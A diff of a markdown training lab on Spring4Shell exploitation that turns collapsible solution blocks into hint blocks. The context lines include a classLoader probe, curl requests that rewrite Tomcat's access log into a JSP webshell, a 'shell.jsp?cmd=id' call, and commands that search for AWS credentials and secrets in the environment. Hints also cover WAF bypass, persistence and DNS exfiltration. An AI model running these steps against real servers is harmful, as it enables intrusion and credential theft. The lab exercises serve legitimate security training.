@@ -123,9 +123,7 @@ This traverses:
 **Setup**: Spring application to test  
 **Goal**: Determine if application is vulnerable
 
-<details>
-<summary>💡 Hint 1: Check version and deployment</summary>
-
+:::hint 💡 Hint 1: Check version and deployment
 Look for:
 1. Spring Framework version in pom.xml/build.gradle
 2. Java version (must be 9+)
@@ -134,11 +132,9 @@ Look for:
 
 How can you determine these remotely?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Test parameter binding</summary>
-
+:::hint 💡 Hint 2: Test parameter binding
 Try sending requests with nested parameters:
 ```
 ?class.module.classLoader.x=test
@@ -146,22 +142,18 @@ Try sending requests with nested parameters:
 
 Look for different responses or errors.
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Error-based detection</summary>
-
+:::hint 💡 Hint 3: Error-based detection
 Some payloads cause specific errors:
 - "Cannot invoke method on null"
 - "No property 'x' found"
 
 These indicate the traversal worked!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Detection Script**:
 ```python
 import requests
@@ -240,7 +232,7 @@ curl http://target/path \
   -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"
 ```
 
-</details>
+:::
 
 ---
 
@@ -249,20 +241,16 @@ curl http://target/path \
 **Setup**: Vulnerable Spring application on Tomcat  
 **Goal**: Achieve remote code execution
 
-<details>
-<summary>💡 Hint 1: Understand the payload structure</summary>
-
+:::hint 💡 Hint 1: Understand the payload structure
 The exploit modifies Tomcat's access log to write a JSP shell:
 1. Change log pattern to JSP code
 2. Change log suffix to .jsp
 3. Change log prefix to webroot path
 4. Trigger logging
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Craft the JSP payload</summary>
-
+:::hint 💡 Hint 2: Craft the JSP payload
 Your JSP shell needs to:
 - Be valid JSP syntax
 - Handle URL encoding
@@ -271,11 +259,9 @@ Your JSP shell needs to:
 
 Start simple!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Multiple requests needed</summary>
-
+:::hint 💡 Hint 3: Multiple requests needed
 You can't do everything in one request. Plan:
 1. Set pattern
 2. Set directory
@@ -283,11 +269,9 @@ You can't do everything in one request. Plan:
 4. Set suffix
 5. Trigger write
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Exploitation Script**:
 ```python
 import requests
@@ -410,7 +394,7 @@ curl http://target/vulnerable
 curl http://target/shell.jsp?cmd=id
 ```
 
-</details>
+:::
 
 ---
 
@@ -419,41 +403,33 @@ curl http://target/shell.jsp?cmd=id
 **Setup**: Partially patched Spring application  
 **Goal**: Exploit despite security measures
 
-<details>
-<summary>💡 Hint 1: Alternative property paths</summary>
-
+:::hint 💡 Hint 1: Alternative property paths
 If `class.module.classLoader` is blocked, try:
 - Different accessors
 - URL encoding
 - Case variations
 - Unicode encoding
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: WAF evasion</summary>
-
+:::hint 💡 Hint 2: WAF evasion
 Common WAF bypasses:
 - Split parameters
 - Use POST with JSON
 - Header injection
 - Multipart forms
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Alternative exploitation</summary>
-
+:::hint 💡 Hint 3: Alternative exploitation
 If AccessLogValve is patched:
 - Look for other writeable properties
 - Memory-based shells
 - Other Tomcat components
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Bypass Techniques**:
 
 **Method 1: Encoding variations**
@@ -592,7 +568,7 @@ memory_shell = {
 }
 ```
 
-</details>
+:::
 
 ---
 
@@ -601,41 +577,33 @@ memory_shell = {
 **Setup**: Successful Spring4Shell exploitation  
 **Goal**: Establish persistence and escalate
 
-<details>
-<summary>💡 Hint 1: Upgrade your shell</summary>
-
+:::hint 💡 Hint 1: Upgrade your shell
 Basic JSP shells are limited. Consider:
 - Deploying a proper webshell
 - Reverse shell
 - In-memory backdoor
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Explore the application</summary>
-
+:::hint 💡 Hint 2: Explore the application
 Look for:
 - Configuration files
 - Database credentials
 - Other vulnerabilities
 - Internal network access
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Persistence methods</summary>
-
+:::hint 💡 Hint 3: Persistence methods
 Beyond webshells:
 - Scheduled tasks
 - Modified JARs
 - Tomcat valves
 - Spring interceptors
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Advanced Webshell Deployment**:
 ```jsp
 <%@ page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*,java.security.*,sun.misc.*" %>
@@ -733,7 +701,7 @@ find / -name "credentials" -path "*.aws*" 2>/dev/null
 env | grep -i "key\|secret\|pass\|token"
 ```
 
-</details>
+:::
 
 ---
 
@@ -741,31 +709,25 @@ env | grep -i "key\|secret\|pass\|token"
 
 **Goal**: Exploit complex real-world scenarios
 
-<details>
-<summary>🎯 Challenge Overview</summary>
-
+:::hint 🎯 Hint 1
 Advanced scenarios:
 1. WAF + Patch bypass
 2. Blind exploitation
 3. Alternative containers
 4. Kubernetes environment
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint: Blind exploitation</summary>
-
+:::hint 💡 Hint 2
 If no direct output:
 - DNS exfiltration
 - Time delays
 - Log poisoning
 - Side channels
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 3
 **Blind Exploitation via DNS**:
 ```python
 def blind_spring4shell(url, collaborator):
@@ -867,7 +829,7 @@ def advanced_bypass(url):
         t.join()
 ```
 
-</details>
+:::
 
 ---
 
